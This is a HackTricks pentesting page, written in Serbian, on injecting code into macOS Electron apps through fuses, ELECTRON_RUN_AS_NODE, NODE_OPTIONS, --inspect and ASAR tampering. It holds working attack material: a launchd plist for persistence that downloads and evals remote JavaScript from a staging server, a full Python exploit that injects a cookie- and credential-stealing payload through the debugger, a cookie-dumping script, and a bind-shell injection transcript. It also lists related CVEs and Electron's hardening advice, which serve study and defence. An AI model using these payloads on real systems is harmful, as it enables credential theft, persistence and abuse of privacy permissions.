# Injekcija u macOS Electron Applications

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako ne znate šta je Electron, [**ovde možete pronaći mnogo informacija**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Za sada je dovoljno da znate da Electron pokreće **node**.\
A node ima određene **parameters** i **env variables** koji mogu da se koriste za **izvršavanje drugog koda**, pored navedenog fajla.

### Electron Fuses

Ove tehnike će biti objašnjene u nastavku, ali je Electron u skorije vreme dodao nekoliko **security flags** za njihovo **sprečavanje**. To su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), a sledeće se koriste za **sprečavanje** da Electron apps u macOS-u **učitavaju proizvoljan kod**:<sup>[1]</sup>

- **`RunAsNode`**: Ako je onemogućen, sprečava upotrebu env var **`ELECTRON_RUN_AS_NODE`** za ubacivanje koda.
- **`EnableNodeCliInspectArguments`**: Ako je onemogućen, params kao što su `--inspect` i `--inspect-brk` neće biti primenjeni. Na ovaj način se sprečava ubacivanje koda.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **file** će biti **validiran** od strane macOS-a. Na ovaj način se **sprečava** **code injection** izmenom sadržaja ovog fajla.
- **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto pretrage i učitavanja sledećim redosledom: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**, proveravaće i koristiti samo app.asar, čime se obezbeđuje da je, kada je **kombinovano** sa **`embeddedAsarIntegrityValidation`** fuse-om, **nemoguće** **učitati kod koji nije validiran**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućen, browser process koristi fajl pod nazivom `browser_v8_context_snapshot.bin` za svoj V8 snapshot.

Još jedan zanimljiv fuse koji neće sprečiti code injection je:

- **EnableCookieEncryption**: Ako je omogućen, cookie store na disku se šifruje pomoću OS level cryptography keys.

### Provera Electron Fuses

Ove **flags** možete **proveriti** iz aplikacije pomoću:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Kao što je [**navedeno u dokumentaciji**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuses** se nalazi unutar **Electron binary** datoteke, koja negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[1]</sup>

U macOS aplikacijama, to se obično nalazi na putanji `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Ovu datoteku možete učitati na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon tog stringa u ASCII formatu možete videti broj „0“ ili „1“, koji označava da li je svaki fuse onemogućen ili omogućen. Samo izmenite hex kod (`0x30` je `0`, a `0x31` je `1`) da biste **izmenili vrednosti fuse-ova**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Imajte na umu da aplikacija neće raditi ako pokušate da **overwrite-ujete** **`Electron Framework` binary** unutar aplikacije nakon izmene ovih bajtova.

## RCE dodavanje koda u Electron Applications

Moguće je da Electron App koristi **external JS/HTML files**, pa bi attacker mogao da inject-uje kod u te fajlove čiji se signature neće proveravati i da izvrši arbitrary code u kontekstu aplikacije.

> [!CAUTION]
> Međutim, trenutno postoje 2 ograničenja:
>
> - Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za izmenu App-a, tako da ovo podrazumevano više nije moguće.
> - Kompajlirani **`asap`** fajl obično ima fuse-ove **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** enabled.
>
> Ovo attack path čini složenijim (ili nemogućim).

Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **izmenom** **asar** fajla pomoću vašeg **malicious** koda, vraćanjem naziva u **`app.app/Contents`** i pokretanjem aplikacije.

Kod iz asar fajla možete raspakovati pomoću:
```bash
npx asar extract app.asar app-decomp
```
I ponovo ga spakujte nakon što ste ga izmenili pomoću:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE pomoću ELECTRON_RUN_AS_NODE

Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ako je ova env promenljiva podešena, proces će biti pokrenut kao običan Node.js proces.<sup>[6]</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ako je fuse **`RunAsNode`** onemogućen, env var **`ELECTRON_RUN_AS_NODE`** će biti ignorisan i ovo neće funkcionisati.

### Injekcija iz App Plist-a

Kao što je [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), mogli biste da zloupotrebite ovu env var u plist-u kako biste održali persistence:<sup>[2]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE sa `NODE_OPTIONS`

Payload možete sačuvati u drugoj datoteci i izvršiti ga:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ako je fuse **`EnableNodeOptionsEnvironmentVariable`** **disabled**, aplikacija će **ignorisati** env var **NODE_OPTIONS** prilikom pokretanja, osim ako je env var **`ELECTRON_RUN_AS_NODE`** podešen; on će takođe biti **ignorisаn** ako je fuse **`RunAsNode`** disabled.
>
> Ako ne podesite **`ELECTRON_RUN_AS_NODE`**, dobićete **grešku**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection iz App Plist-a

Ovaj env var možete zloupotrebiti u plist-u radi održavanja persistence-a dodavanjem sledećih ključeva:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE sa inspectingom

Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako pokrenete Electron application sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren**, pa ćete moći da se povežete na njega (na primer iz Chrome-a preko `chrome://inspect`) i moći ćete da **inject-ujete code u njega** ili čak da pokrenete nove procese.<sup>[7]</sup>\
Na primer:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
U [**ovom blogpostu**](https://hackerone.com/reports/1274695), ovaj debugging se zloupotrebljava za navođenje headless chrome-a da **preuzima proizvoljne fajlove na proizvoljne lokacije**.<sup>[8]</sup>

> [!TIP]
> Ako aplikacija ima sopstveni način provere da li su env promenljive ili parametri, kao što je `--inspect`, podešeni, možete pokušati da ga **zaobiđete** tokom izvršavanja pomoću argumenta `--inspect-brk`, koji će **zaustaviti izvršavanje** na početku aplikacije i izvršiti bypass (na primer, prepisivanjem argumenata ili env promenljivih trenutnog procesa).

U nastavku je prikazan exploit kojim je, nadgledanjem i izvršavanjem aplikacije sa parametrom `--inspect-brk`, bilo moguće zaobići prilagođenu zaštitu koju je imala (prepisivanjem parametara procesa radi uklanjanja `--inspect-brk`), a zatim ubaciti JS payload za izvlačenje kolačića i credentiala iz aplikacije:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Ako je fuse **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **ignoristati node parametre** (kao što je `--inspect`) prilikom pokretanja, osim ako nije postavljena env promenljiva **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je fuse **`RunAsNode`** onemogućen.
>
> Međutim, i dalje možete koristiti **electron parametar `--remote-debugging-port=9229`**, ali prethodni payload neće raditi za izvršavanje drugih procesa.

Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron App, kao što su **istorija** (pomoću GET komandi) ili **cookies** browsera (pošto su **dekriptovani** unutar browsera i postoji **json endpoint** koji će ih prikazati).

Kako to možete uraditi možete saznati [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), a možete koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan script poput:<sup>[9][10]</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Možete zloupotrebiti ovu env promenljivu u plist-u da biste održali persistence dodavanjem ovih ključeva:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass zloupotrebom starijih verzija

> [!TIP]
> TCC daemon iz macOS-a ne proverava verziju aplikacije koja se izvršava. Dakle, ako **ne možete da inject-ujete code u Electron application** pomoću neke od prethodnih tehnika, možete preuzeti prethodnu verziju APP-a i inject-ovati code u nju, jer će i dalje dobiti TCC privileges (osim ako je Trust Cache ne spreči).

## Pokretanje koda koji nije JS

Prethodne tehnike će vam omogućiti da pokrenete **JS code unutar procesa Electron application**. Međutim, imajte na umu da **child processes rade pod istim sandbox profile-om** kao parent application i **nasleđuju njihove TCC permissions**.\
Zato, ako želite da zloupotrebite entitlements za pristup kameri ili mikrofonu, na primer, možete jednostavno **pokrenuti drugi binary iz procesa**.

## Značajne Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 i različiti pre-release-ovi verzija 23-27 omogućavali su attacker-u sa write access-om do `.app/Contents/Resources` foldera da zaobiđe `embeddedAsarIntegrityValidation` **i** `onlyLoadAppFromAsar` fuses. Bug je bio *file-type confusion* u integrity checker-u, koji je omogućavao da se učita **directory nazvan `app.asar`** umesto validiranog archive-a, pa je bilo koji JavaScript smešten unutar tog directory-ja bio izvršen pri pokretanju application-a. Zbog toga su čak i vendor-i koji su pratili hardening guidance i omogućili oba fuse-a i dalje bili vulnerable na macOS-u.<sup>[3]</sup>

Patched Electron versions: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** i **27.0.0-alpha.7**. Attackers koji pronađu application koja koristi stariji build mogu da overwrite-uju `Contents/Resources/app.asar` sopstvenim directory-jem i izvrše code sa TCC entitlements aplikacije.<sup>[3]</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

U januaru 2024. serija CVE-ova (CVE-2024-23738 do CVE-2024-23743) pokazala je da mnoge Electron applications i dalje isporučuju fuse-ove **RunAsNode** i **EnableNodeCliInspectArguments** kao enabled. Local attacker zato može ponovo da pokrene program sa environment variable-om `ELECTRON_RUN_AS_NODE=1` ili flag-ovima kao što je `--inspect-brk`, kako bi ga pretvorio u *generic* Node.js process i nasledio sve sandbox i TCC permissions aplikacije.<sup>[4]</sup>

Iako je Electron team osporio “critical” rating i naveo da attacker već mora imati local code–execution, issue je i dalje koristan tokom post-exploitation-a, jer bilo koji vulnerable Electron bundle pretvara u *living-off-the-land* binary koji, na primer, može da čita Contacts, Photos ili druge sensitive resources kojima je desktop app prethodno dobio pristup.<sup>[4]</sup>

Defensive guidance kompanije Electron:<sup>[4]</sup>

* Disable-ujte `RunAsNode` i `EnableNodeCliInspectArguments` fuse-ove u production build-ovima.
* Koristite noviji **UtilityProcess** API ako vaš application legitimno zahteva helper Node.js process, umesto ponovnog enable-ovanja tih fuse-ova.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) može se jednostavno koristiti za **pronalaženje vulnerable electron applications** koje su instalirane i inject-ovanje code-a u njih. Ovaj tool će pokušati da koristi **`--inspect`** tehniku:

Potrebno je da ga sami compile-ujete, a možete ga koristiti ovako:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki je dizajniran da napravi backdoor u Electron aplikacijama zamenom JavaScript datoteka aplikacija Loki Command & Control JavaScript datotekama.


## Reference

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [macOS Injection putem Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Zaobilaženje ASAR Integrity putem zabune oko tipa datoteke (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Izjava u vezi sa 'runAsNode' CVE-ovima - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Novo oružje u vašem Red Teaming arsenalu - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Zašto Electron aplikacije ne mogu poverljivo da čuvaju vaše secrets: --inspect opcija](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging zloupotrebljen za preuzimanje proizvoljnih datoteka](https://hackerone.com/reports/1274695)
- [9] [Ruke u Cookie Jar-u: Dumping Cookies pomoću Chromium-ovog Remote Debugger porta - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Otklanjanje grešaka pri neuspešnom Dumping Cookies pomoću Chromium-ovog Remote Debugger-a - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
